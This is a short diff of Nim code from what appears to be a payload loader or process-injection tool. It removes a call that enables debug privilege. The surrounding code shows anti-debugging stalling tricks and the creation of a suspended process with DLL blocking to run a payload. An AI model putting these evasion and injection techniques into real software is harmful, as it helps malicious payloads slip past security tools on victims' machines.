@@ -69,9 +69,6 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
         elif antiDebugAction == protectString("troll"):
             sleepUselessCalculations(999999999)
 
-    # Enable debug privilege
-    discard setDebugPrivilege()
-
     # Create suspended process with extended attributes (block dll's)
     var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)
 
